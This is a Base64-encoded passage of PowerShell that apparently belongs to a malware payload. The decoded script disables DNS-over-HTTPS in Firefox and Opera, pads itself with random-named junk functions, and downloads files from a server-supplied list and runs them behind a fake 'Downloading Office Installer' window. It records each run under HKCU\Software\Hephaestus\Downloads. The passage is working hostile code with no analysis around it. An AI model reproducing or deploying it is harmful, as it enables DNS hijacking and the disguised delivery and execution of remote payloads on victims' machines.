VySFRUUFMnDQogICAgICAgICkgLVZhbHVlTmFtZXMgQCgnRW5hYmxlZCcsICdMb2NrZWQnKSAtVmFsdWVzIEAoMCwgMSkNCiAgICB9DQogICAgY2F0Y2ggDQogICAgew0KICAgICAgICB3cml0ZWRiZyAiRmFpbGVkIHRvIHNldCBmaXJlZm94IHJlZ2lzdHJ5OiAkXyINCiAgICB9DQogICAgZm9yZWFjaCAoJGRpciBpbiBHZXQtRW52UGF0aHMpIA0KICAgIHsNCiAgICAgICAgdHJ5IA0KICAgICAgICB7DQogICAgICAgICRwYXRoID0gSm9pbi1QYXRoIC1QYXRoICRkaXIgLUNoaWxkUGF0aCAiTW96aWxsYVxGaXJlZm94XFByb2ZpbGVzXHVzZXIuanMiDQoNCiAgICAgICAgICAgICRVc2VySlNDb250ZW50ID0gJ3VzZXJfcHJlZigibmV0d29yay50cnIubW9kZSIsIDUpOycNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKCEoVGVzdC1QYXRoIC1QYXRoICRwYXRoIC1QYXRoVHlwZSBMZWFmKSkgDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgTmV3LUl0ZW0gLVBhdGggJHBhdGggLUl0ZW1UeXBlIEZpbGUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgICAgICAgICBBZGQtQ29udGVudCAtUGF0aCAkcGF0aCAtVmFsdWUgJFVzZXJKU0NvbnRlbnQgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCANCiAgICAgICAgew0KICAgICAgICAgICAgd3JpdGVkYmcgIkZhaWxlZCB0byB3cml0ZSB0byB1c2VyLmpzIGZpbGU6ICRfIg0KICAgICAgICB9DQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIFNldC1GaXJlZm94UmVnaXN0cnkgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ1tdXSRLZXlQYXRocywNCiAgICAgICAgW3N0cmluZ1tdXSRWYWx1ZU5hbWVzLA0KICAgICAgICBbaW50W11dJFZhbHVlcw0KICAgICkNCg0KICAgICRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAnU3RvcCcNCiAgICAkcmVnS2V5ID0gW01pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeV06OkxvY2FsTWFjaGluZQ0KDQogICAgdHJ5IHsNCiAgICAgICAgZm9yZWFjaCAoJGkgaW4gMC4uKCRLZXlQYXRocy5MZW5ndGggLSAxKSkgew0KICAgICAgICAgICAgJGtleSA9ICRyZWdLZXkuT3BlblN1YktleSgkS2V5UGF0aHNbJGldLCAkdHJ1ZSkNCiAgICAgICAgICAgIGlmICgka2V5IC1lcSAkbnVsbCkgew0KICAgICAgICAgICAgICAgIHdyaXRlZGJnICJGYWlsZWQgdG8gb3BlbiByZWdpc3RyeSBrZXk6ICQoJEtleVBhdGhzWyRpXSkiDQogICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICRrZXkuU2V0VmFsdWUoJFZhbHVlTmFtZXNbJGldLCAkVmFsdWVzWyRpXSwgW01pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeVZhbHVlS2luZF06OkRXb3JkKQ0KICAgICAgICAgICAgJGtleS5DbG9zZSgpDQogICAgICAgIH0NCiAgICB9DQogICAgY2F0Y2ggew0KICAgICAgICB3cml0ZWRiZyAiRXJyb3IgYWNjZXNzaW5nIG9yIG1vZGlmeWluZyByZWdpc3RyeTogJF8iDQogICAgfQ0KfQ0KZnVuY3Rpb24gZm5fTG9nX0FDYjhvV2g3bFggew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kbWVzc2FnZQ0KICAgICkNCiAgICB3cml0ZWRiZzIgJ0xvZzogJG1lc3NhZ2UnDQp9DQpmdW5jdGlvbiBmbl9lVG53RnlCSFZqIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtpbnRdJHZhcl9IY1pBdUJ6c0M4LA0KICAgICAgICBbaW50XSR2YXJfM0owR2N2cGVhcg0KICAgICkNCiAgICAkcmVzdWx0ID0gJHZhcl9IY1pBdUJ6c0M4ICsgJHZhcl8zSjBHY3ZwZWFyDQogICAgcmV0dXJuICRyZXN1bHQNCn0NCmZ1bmN0aW9uIGZuX245OFVaS3hkeU4gew0KICAgIHBhcmFtICgNCiAgICAgICAgW2ludF0kdmFyXzNKMEdjdnBlYXIsDQogICAgICAgIFtpbnRdJHZhcl9IY1pBdUJ6c0M4DQogICAgKQ0KICAgICRyZXN1bHQgPSAkdmFyXzNKMEdjdnBlYXIgKyAkdmFyX0hjWkF1QnpzQzgNCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KaWYgKCR2YXJfSGNaQXVCenNDOCAtZ3QgNCkgew0KICAgIHdyaXRlZGJnMiAna2ZQQ0xSWXNXOTVxWE5EJw0KfSBlbHNlIHsNCiAgICB3cml0ZWRiZzIgJzdFNnRTMlZMY0FiUGpDRCcNCn0NCmlmICgkdmFyXzNKMEdjdnBlYXIgLWd0IDQpIHsNCiAgICB3cml0ZWRiZzIgJ3BYb2ZVRTBHZHpING54dycNCn0gZWxzZSB7DQogICAgd3JpdGVkYmcyICdVSUFsZmttOHRHTWNhSHgnDQp9DQokdmFyXzNKMEdjdnBlYXIgPSBmbl9lVG53RnlCSFZqIC1wYXJhbTEgMjQgLXBhcmFtMiAyNw0Kd3JpdGVkYmcyICdBVkZ5bWNHc0hwRHFvSmEnDQokdmFyXzNKMEdjdnBlYXIgPSBmbl9uOThVWkt4ZHlOIC1wYXJhbTEgNzAgLXBhcmFtMiA2Nw0Kd3JpdGVkYmcyICdOZjVhVVl6bnFtVjJKd08nDQokdmFyX0hjWkF1QnpzQzggPSBmbl9lVG53RnlCSFZqIC1wYXJhbTEgMjEgLXBhcmFtMiAzNA0Kd3JpdGVkYmcyICdYZURRdm1KV1JLaVN1T0gnDQokdmFyXzNKMEdjdnBlYXIgPSBmbl9lVG53RnlCSFZqIC1wYXJhbTEgMSAtcGFyYW0yIDY0DQp3cml0ZWRiZzIgJ25HUG02a3hMb2FoRTVkMycNCiR2YXJfSGNaQXVCenNDOCA9IGZuX245OFVaS3hkeU4gLXBhcmFtMSAxMiAtcGFyYW0yIDcxDQp3cml0ZWRiZzIgJzZLTUlhUnVpY3ZCMXQ4aCcNCiAKCiMgb3BlcmEucHMxCgoKCg0KCgoNCg0KZnVuY3Rpb24gZG9fb3BlcmENCnsNCiAgICBDbG9zZS1Qcm9jZXNzZXMoQCgnb3BlcmFfY3Jhc2hyZXBvcnRlci5leGUnLCAnb3BlcmEuZXhlJykpDQoNCiAgICBmb3JlYWNoICgkZGlyIGluIEdldC1FbnZQYXRocykgew0KICAgICAgICAkcGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkZGlyIC1DaGlsZFBhdGggJ09wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZVxMb2NhbCBTdGF0ZScNCg0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAkcGF0aCAtUGF0aFR5cGUgTGVhZikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBDb25maWd1cmVPcGVyYUludGVybmFsIC1GaWxlUGF0aCAkcGF0aA0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAgIHdyaXRlZGJnICJFcnJvciBvY2N1cnJlZCBpbiBPcGVyYTogJF8iDQogICAgICAgIH0NCiAgICB9DQp9DQoNCmZ1bmN0aW9uIENvbmZpZ3VyZU9wZXJhSW50ZXJuYWwgew0KICAgIHBhcmFtKA0KICAgICAgICBbc3RyaW5nXSRmaWxlUGF0aA0KICAgICkNCg0KICAgICRjb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJGZpbGVQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uDQoNCiAgICBpZiAoJG51bGwgLWVxICRjb250ZW50LmRuc19vdmVyX2h0dHBzIC1vciAkY29udGVudC5kbnNfb3Zlcl9odHRwcyAtaXNub3QgW29iamVjdF0pIHsNCiAgICAgICAgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMgPSBAew0KICAgICAgICAgICAgJ21vZGUnID0gJ29mZicNCiAgICAgICAgICAgICdvcGVyYScgPSBAew0KICAgICAgICAgICAgICAgICdkb2hfbW9kZScgPSAnb2ZmJw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJ3RlbXBsYXRlcycgPSAiIg0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMubW9kZSA9ICdvZmYnDQogICAgICAgICRjb250ZW50LmRuc19vdmVyX2h0dHBzLm9wZXJhID0gQHsNCiAgICAgICAgICAgICdkb2hfbW9kZScgPSAnb2ZmJw0KICAgICAgICB9DQogICAgICAgICRjb250ZW50LmRuc19vdmVyX2h0dHBzLnRlbXBsYXRlcyA9ICIiDQogICAgfQ0KDQogICAgJGpzb25TdHJpbmcgPSAkY29udGVudCB8IENvbnZlcnRUby1Kc29uIC1EZXB0aCAxMA0KDQogICAgU2V0LUNvbnRlbnQgLVBhdGggJGZpbGVQYXRoIC1WYWx1ZSAkanNvblN0cmluZyAtRW5jb2RpbmcgVVRGOCAtRm9yY2UNCg0KICAgIHdyaXRlZGJnICJTdWNjZXNzZnVsbHkgY29uZmlndXJlZCBPcGVyYSBzZXR0aW5ncyBpbiAkZmlsZVBhdGgiDQp9DQpmdW5jdGlvbiBmbl9Mb2dfYXQ2b1VGTjRDciB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRtZXNzYWdlDQogICAgKQ0KICAgIHdyaXRlZGJnMiAnTG9nOiAkbWVzc2FnZScNCn0NCmZ1bmN0aW9uIGZuX2ZHbzJlSTd6cGogew0KICAgIHBhcmFtICgNCiAgICAgICAgW2ludF0kdmFyX2ZJVG15dFhuWWUsDQogICAgICAgIFtpbnRdJHZhcl9Jc0pGUjZaTjhQDQogICAgKQ0KICAgICRyZXN1bHQgPSAkdmFyX2ZJVG15dFhuWWUgKyAkdmFyX0lzSkZSNlpOOFANCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KZnVuY3Rpb24gZm5fbnFDYTRGdWxUeSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbaW50XSR2YXJfSXNKRlI2Wk44UCwNCiAgICAgICAgW2ludF0kdmFyX2ZJVG15dFhuWWUNCiAgICApDQogICAgJHJlc3VsdCA9ICR2YXJfSXNKRlI2Wk44UCArICR2YXJfZklUbXl0WG5ZZQ0KICAgIHJldHVybiAkcmVzdWx0DQp9DQppZiAoJHZhcl9mSVRteXRYblllIC1ndCAxKSB7DQogICAgd3JpdGVkYmcyICdzUk5veW5POWE1S1RkMjAnDQp9IGVsc2Ugew0KICAgIHdyaXRlZGJnMiAnVVFGUHU1amszd0lvYzgxJw0KfQ0KaWYgKCR2YXJfSXNKRlI2Wk44UCAtZ3QgMSkgew0KICAgIHdyaXRlZGJnMiAnYlczQUJocExaTW13RzZjJw0KfSBlbHNlIHsNCiAgICB3cml0ZWRiZzIgJ0hSZk1qSjZLTjBaY3JueScNCn0NCiR2YXJfZklUbXl0WG5ZZSA9IGZuX2ZHbzJlSTd6cGogLXBhcmFtMSA0NCAtcGFyYW0yIDEyDQp3cml0ZWRiZzIgJ3RBTXlqRW5MWktTVUdxMicNCiR2YXJfZklUbXl0WG5ZZSA9IGZuX2ZHbzJlSTd6cGogLXBhcmFtMSA5NyAtcGFyYW0yIDcNCndyaXRlZGJnMiAnWnEwcHY5M01FWXk2dDJQJw0KJHZhcl9Jc0pGUjZaTjhQID0gZm5fZkdvMmVJN3pwaiAtcGFyYW0xIDc3IC1wYXJhbTIgMzYNCndyaXRlZGJnMiAnb0dacHVmNHduRjhTZ0VzJw0KJHZhcl9mSVRteXRYblllID0gZm5fbnFDYTRGdWxUeSAtcGFyYW0xIDMyIC1wYXJhbTIgNDENCndyaXRlZGJnMiAnUDZzd2JlWk5SRUxsVWRxJw0KJHZhcl9Jc0pGUjZaTjhQID0gZm5fZkdvMmVJN3pwaiAtcGFyYW0xIDE2IC1wYXJhbTIgODENCndyaXRlZGJnMiAnNW5xMmYxTHNtbDN4Tjk2Jw0KIAoKIyBzdGFydGRvd25sb2Fkcy5wczEKCgoKDQoKCg0KDQpmdW5jdGlvbiBHZXQtRmlsZU5hbWVGcm9tVXJpIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHVyaQ0KICAgICkNCg0KICAgICMgQ3JlYXRlIGEgVXJpIG9iamVjdA0KICAgICR1cmlPYmplY3QgPSBbU3lzdGVtLlVyaV06Om5ldygkdXJpKQ0KDQogICAgIyBFeHRyYWN0IHRoZSBmaWxlIG5hbWUgZnJvbSB0aGUgcGF0aCBvZiB0aGUgVVJJDQogICAgJGZpbGVOYW1lID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0RmlsZU5hbWUoJHVyaU9iamVjdC5BYnNvbHV0ZVBhdGgpDQoNCiAgICByZXR1cm4gJGZpbGVOYW1lDQp9DQoNCmZ1bmN0aW9uIEFkZC1SYW5kb21EaWdpdHNUb0ZpbGVuYW1lIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJGZpbGVOYW1lDQogICAgKQ0KDQogICAgIyBTcGxpdCBmaWxlbmFtZSBpbnRvIGJhc2UgYW5kIGV4dGVuc2lvbg0KICAgICRiYXNlTmFtZSA9ICRmaWxlTmFtZSAtcmVwbGFjZSAnXC5bXi5dKyQnLCAnJw0KICAgICRleHRlbnNpb24gPSAkZmlsZU5hbWUgLXJlcGxhY2UgJy4qXC4nLCAnLicNCg0KICAgICMgR2VuZXJhdGUgYSByYW5kb20gbnVtYmVyIGJldHdlZW4gMTAwMCBhbmQgOTk5OQ0KICAgICRyYW5kb21OdW1iZXIgPSBHZXQtUmFuZG9tIC1NaW5pbXVtIDEwMDAgLU1heGltdW0gOTk5OQ0KDQogICAgIyBDb21iaW5lIGJhc2UgbmFtZSwgcmFuZG9tIG51bWJlciwgYW5kIGV4dGVuc2lvbg0KICAgICRuZXdGaWxlTmFtZSA9ICIkYmFzZU5hbWUiICsgIl8kcmFuZG9tTnVtYmVyJGV4dGVuc2lvbiINCg0KICAgIHJldHVybiAkbmV3RmlsZU5hbWUNCn0NCg0KZnVuY3Rpb24gU3RhcnQtRG93bmxvYWRBbmRFeGVjdXRlIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHVybCwNCiAgICAgICAgW3N0cmluZ10kdGl0bGUNCiAgICApDQoNCiAgICBBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5XaW5kb3dzLkZvcm1zDQogICAgQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uRHJhd2luZw0KDQogICAgIyBDcmVhdGUgYW5kIGNvbmZpZ3VyZSB0aGUgZm9ybQ0KICAgICRmb3JtID0gTmV3LU9iamVjdCBTeXN0ZW0uV2luZG93cy5Gb3Jtcy5Gb3JtDQogICAgJGZvcm0uVGV4dCA9ICR0aXRsZQ0KICAgICRmb3JtLlNpemUgPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLlNpemUoNDAwLCAyMDApDQogICAgJGZvcm0uU3RhcnRQb3NpdGlvbiA9ICJDZW50ZXJTY3JlZW4iDQoNCiAgICAjIENyZWF0ZSBhbmQgY29uZmlndXJlIHRoZSBwcm9ncmVzcyBiYXINCiAgICAkcHJvZ3Jlc3NCYXIgPSBOZXctT2JqZWN0IFN5c3RlbS5XaW5kb3dzLkZvcm1zLlByb2dyZXNzQmFyDQogICAgJHByb2dyZXNzQmFyLk1pbmltdW0gPSAwDQogICAgJHByb2dyZXNzQmFyLk1heGltdW0gPSAxMDANCiAgICAkcHJvZ3Jlc3NCYXIuU3RlcCA9IDENCiAgICAkcHJvZ3Jlc3NCYXIuVmFsdWUgPSAwDQogICAgJHByb2dyZXNzQmFyLldpZHRoID0gMzUwDQogICAgJHByb2dyZXNzQmFyLkhlaWdodCA9IDMwDQogICAgJHByb2dyZXNzQmFyLlRvcCA9IDgwDQogICAgJHByb2dyZXNzQmFyLkxlZnQgPSAyMA0KICAgICRmb3JtLkNvbnRyb2xzLkFkZCgkcHJvZ3Jlc3NCYXIpDQoNCiAgICAjIENyZWF0ZSBhbmQgY29uZmlndXJlIHRoZSBzdGF0dXMgbGFiZWwNCiAgICAkc3RhdHVzTGFiZWwgPSBOZXctT2JqZWN0IFN5c3RlbS5XaW5kb3dzLkZvcm1zLkxhYmVsDQogICAgJHN0YXR1c0xhYmVsLlRleHQgPSAiRG93bmxvYWRpbmcuLi4iDQogICAgJHN0YXR1c0xhYmVsLkF1dG9TaXplID0gJHRydWUNCiAgICAkc3RhdHVzTGFiZWwuVG9wID0gNTANCiAgICAkc3RhdHVzTGFiZWwuTGVmdCA9IDIwDQogICAgJGZvcm0uQ29udHJvbHMuQWRkKCRzdGF0dXNMYWJlbCkNCg0KICAgICMgQ3JlYXRlIGFuZCBjb25maWd1cmUgdGhlIGRlc2NyaXB0aW9uIGxhYmVsDQogICAgJGRlc2NyaXB0aW9uTGFiZWwgPSBOZXctT2JqZWN0IFN5c3RlbS5XaW5kb3dzLkZvcm1zLkxhYmVsDQogICAgJGRlc2NyaXB0aW9uTGFiZWwuVGV4dCA9ICJUaGUgaW5zdGFsbGVyIGlzIGN1cnJlbnRseSBiZWluZyBkb3dubG9hZGVkLiBQbGVhc2Ugd2FpdCB1bnRpbCB0aGUgcHJvY2VzcyBjb21wbGV0ZXMuIg0KICAgICRkZXNjcmlwdGlvbkxhYmVsLkF1dG9TaXplID0gJHRydWUNCiAgICAkZGVzY3JpcHRpb25MYWJlbC5XaWR0aCA9IDM1MA0KICAgICRkZXNjcmlwdGlvbkxhYmVsLlRvcCA9IDEwDQogICAgJGRlc2NyaXB0aW9uTGFiZWwuTGVmdCA9IDIwDQogICAgJGZvcm0uQ29udHJvbHMuQWRkKCRkZXNjcmlwdGlvbkxhYmVsKQ0KDQogICAgIyBTaG93IHRoZSBmb3JtIG5vbi1tb2RhbGx5DQogICAgJGZvcm0uU2hvdygpDQoNCiAgICAjIERldGVybWluZSB0aGUgZmlsZSBuYW1lIGFuZCBwYXRoDQogICAgJGZpbGVOYW1lID0gR2V0LUZpbGVOYW1lRnJvbVVyaSAtdXJpICR1cmwNCiAgICAkZmlsZU5hbWVTYXZlID0gQWRkLVJhbmRvbURpZ2l0c1RvRmlsZW5hbWUgLWZpbGVOYW1lICRmaWxlTmFtZQ0KDQogICAgJHRlbXBEaXIgPSAoU3BsaXQtUGF0aCAtUGF0aCAkUFNDb21tYW5kUGF0aCkNCiAgICAkaW5zdGFsbGVyUGF0aCA9IFtTeXN0ZW0uSU8uUGF0aF06OkNvbWJpbmUoJHRlbXBEaXIsICRmaWxlTmFtZVNhdmUpDQoNCiAgICAjIENyZWF0ZSBhbmQgY29uZmlndXJlIHRoZSBXZWJDbGllbnQNCiAgICAkd2ViQ2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudA0KDQogICAgIyBEZWZpbmUgZXZlbnQgaGFuZGxlcnMNCiAgICAkcHJvZ3Jlc3NDaGFuZ2VkSGFuZGxlciA9IFtTeXN0ZW0uTmV0LkRvd25sb2FkUHJvZ3Jlc3NDaGFuZ2VkRXZlbnRIYW5kbGVyXXsNCiAgICAgICAgcGFyYW0gKCRzZW5kZXIsICRldmVudEFyZ3MpDQogICAgICAgICRwcm9ncmVzc0Jhci5WYWx1ZSA9ICRldmVudEFyZ3MuUHJvZ3Jlc3NQZXJjZW50YWdlDQogICAgICAgICRmb3JtLlJlZnJlc2goKQ0KICAgIH0NCg0KICAgICRkb3dubG9hZEZpbGVDb21wbGV0ZWRIYW5kbGVyID0gW1N5c3RlbS5Db21wb25lbnRNb2RlbC5Bc3luY0NvbXBsZXRlZEV2ZW50SGFuZGxlcl17DQogICAgICAgIHBhcmFtICgkc2VuZGVyLCAkZXZlbnRBcmdzKQ0KICAgICAgICAjIENsb3NlIHRoZSBmb3JtIGJlZm9yZSBzdGFydGluZyB0aGUgaW5zdGFsbGVyDQogICAgICAgICRmb3JtLkludm9rZShbYWN0aW9uXSB7IA0KICAgICAgICAgICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLkFwcGxpY2F0aW9uXTo6RG9FdmVudHMoKQ0KICAgICAgICAgICAgJGZvcm0uQ2xvc2UoKSANCiAgICAgICAgICAgIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BcHBsaWNhdGlvbl06OkRvRXZlbnRzKCkNCiAgICAgICAgfSkNCiAgICAgICAgDQogICAgICAgIGlmICgkZXZlbnRBcmdzLkVycm9yKSB7DQogICAgICAgICAgICBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveF06OlNob3coIkVycm9yIGRvd25sb2FkaW5nIGZpbGU6ICIgKyAkZXZlbnRBcmdzLkVycm9yLk1lc3NhZ2UsICJEb3dubG9hZCBFcnJvciIsIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94QnV0dG9uc106Ok9LLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEljb25dOjpFcnJvcikNCiAgICAgICAgfSBlbHNlaWYgKCRldmVudEFyZ3MuQ2FuY2VsbGVkKSB7DQogICAgICAgICAgICBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveF06OlNob3coIkRvd25sb2FkIGNhbmNlbGxlZC4iLCAiRG93bmxvYWQgQ2FuY2VsbGVkIiwgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hCdXR0b25zXTo6T0ssIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94SWNvbl06Oldhcm5pbmcpDQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgICMgRXhlY3V0ZSB0aGUgaW5zdGFsbGVyDQogICAgICAgICAgICAgICAgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJGluc3RhbGxlclBhdGggLVdhaXQNCg0KICAgICAgICAgICAgICAgICMgV3JpdGUgdG8gdGhlIHJlZ2lzdHJ5DQogICAgICAgICAgICAgICAgJHJlZ2lzdHJ5UGF0aCA9ICJIS0NVOlxTb2Z0d2FyZVxIZXBoYWVzdHVzXERvd25sb2FkcyINCiAgICAgICAgICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyZWdpc3RyeVBhdGgpKSB7DQogICAgICAgICAgICAgICAgICAgIE5ldy1JdGVtIC1QYXRoICRyZWdpc3RyeVBhdGggLUZvcmNlIHwgT3V0LU51bGwNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnaXN0cnlQYXRoIC1OYW1lICRmaWxlTmFtZSAtVmFsdWUgIkRvd25sb2FkZWQiDQogICAgICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAgICAgICBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveF06OlNob3coIkVycm9yIGV4ZWN1dGluZyB0aGUgaW5zdGFsbGVyOiAiICsgJF8uRXhjZXB0aW9uLk1lc3NhZ2UsICJFeGVjdXRpb24gRXJyb3IiLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEJ1dHRvbnNdOjpPSywgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hJY29uXTo6RXJyb3IpDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLkFwcGxpY2F0aW9uXTo6RG9FdmVudHMoKQ0KICAgIH0NCg0KICAgICMgQWRkIGV2ZW50IGhhbmRsZXJzIHRvIFdlYkNsaWVudA0KICAgICR3ZWJDbGllbnQuYWRkX0Rvd25sb2FkUHJvZ3Jlc3NDaGFuZ2VkKCRwcm9ncmVzc0NoYW5nZWRIYW5kbGVyKQ0KICAgICR3ZWJDbGllbnQuYWRkX0Rvd25sb2FkRmlsZUNvbXBsZXRlZCgkZG93bmxvYWRGaWxlQ29tcGxldGVkSGFuZGxlcikNCg0KICAgIHRyeSB7DQogICAgICAgICMgU3RhcnQgdGhlIGRvd25sb2FkDQogICAgICAgICR3ZWJDbGllbnQuRG93bmxvYWRGaWxlQXN5bmMoW1VyaV0kdXJsLCAkaW5zdGFsbGVyUGF0aCkNCiAgICAgICAgDQogICAgICAgICMgS2VlcCB0aGUgZm9ybSByZXNwb25zaXZlIHdoaWxlIHRoZSBkb3dubG9hZCBpcyBpbiBwcm9ncmVzcw0KICAgICAgICB3aGlsZSAoJGZvcm0uVmlzaWJsZSkgew0KICAgICAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyAxDQogICAgICAgICAgICBbU3lzdGVtLldpbmRvd3MuRm9ybXMuQXBwbGljYXRpb25dOjpEb0V2ZW50cygpDQogICAgICAgIH0NCiAgICB9IGNhdGNoIHsNCiAgICAgICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hdOjpTaG93KCJFcnJvciBpbml0aWF0aW5nIGRvd25sb2FkOiAiICsgJF8uRXhjZXB0aW9uLk1lc3NhZ2UsICJEb3dubG9hZCBFcnJvciIsIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94QnV0dG9uc106Ok9LLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEljb25dOjpFcnJvcikNCiAgICAgICAgJGZvcm0uQ2xvc2UoKQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gRG93bmxvYWQgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kdXJsLA0KICAgICAgICBbc3RyaW5nXSR0aXRsZQ0KICAgICkNCg0KICAgICRmaWxlTmFtZSA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldEZpbGVOYW1lKCR1cmwpDQoNCiAgICAkYXV0byA9IFRlc3QtQXV0b3N0YXJ0Ow0KICAgIGlmICgkc2VydmVyLnN0YXJ0RG93bmxvYWRzRm9yY2UgLW5lICRmYWxzZSAtYW5kICRhdXRvIC1lcSAkdHJ1ZSkNCiAgICB7DQogICAgICAgICRyZWdpc3RyeVBhdGggPSAiSEtDVTpcU29mdHdhcmVcSGVwaGFlc3R1c1xEb3dubG9hZHMiDQogICAgICAgIGlmIChUZXN0LVBhdGggJHJlZ2lzdHJ5UGF0aCkgew0KICAgICAgICAgICAgJGluc3RhbGxlZCA9IEdldC1JdGVtUHJvcGVydHkgLVBhdGggJHJlZ2lzdHJ5UGF0aCAtTmFtZSAkZmlsZU5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgICAgIGlmICgkaW5zdGFsbGVkKSANCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB3cml0ZWRiZyAiVGhlIGZpbGUgJyRmaWxlTmFtZScgaXMgYWxyZWFkeSBpbnN0YWxsZWQuIg0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybg0KICAgIH0NCg0KICAgIFN0YXJ0LURvd25sb2FkQW5kRXhlY3V0ZSAtdXJsICR1cmwgLXRpdGxlICR0aXRsZQ0KfQ0KDQpmdW5jdGlvbiBkb19zdGFydGRvd25sb2FkcyB7DQogICAgdHJ5IA0KICAgIHsNCiAgICAgICAgZm9yZWFjaCAoJHVybCBpbiAkc2VydmVyLnN0YXJ0RG93bmxvYWRzKQ0KICAgICAgICB7DQogICAgICAgICAgICBEb3dubG9hZCAtdXJsICR1cmwgLXRpdGxlICJEb3dubG9hZGluZyBPZmZpY2UgSW5zdGFsbGVyIg0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICAgIHdyaXRlZGJnICJBbiBlcnJvciBvY2N1cnJlZCAoU3RhcnQgRG93bmxvYWRzKTogJF8iDQogICAgfQ0KfQ0KZnVuY3Rpb24gZm5fTG9nX1pTckxXSWVnUW0gew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kbWVzc2FnZQ0KICAgICkNCiAgICB3cml0ZWRiZzIgJ0xvZzogJG1lc3NhZ2UnDQp9DQpmdW5jdGlvbiBmbl81eW9ncERVZU9LIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtpbnRdJHZhcl9rZjU2Y1l2R1RtLA0KICAgICAgICBbaW50XSR2YXJfSDRTUHZoMzhWeQ0KICAgICkNCiAgICAkcmVzdWx0ID0gJHZhcl9rZjU2Y1l2R1RtICsgJHZhcl9INFNQdmgzOFZ5DQogICAgcmV0dXJuICRyZXN1bHQNCn0NCmZ1bmN0aW9uIGZuX1duaDZIS3FWVGQgew0KICAgIHBhcmFtICgNCiAgICAgICAgW2ludF0kdmFyX0g0U1B2aDM4VnksDQogICAgICAgIFtpbnRdJHZhcl9rZjU2Y1l2R1RtDQogICAgKQ0KICAgICRyZXN1bHQgPSAkdmFyX0g0U1B2aDM4VnkgKyAkdmFyX2tmNTZjWXZHVG0NCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KaWYgKCR2YXJfa2Y1NmNZdkdUbSAtZ3QgMykgew0KICAg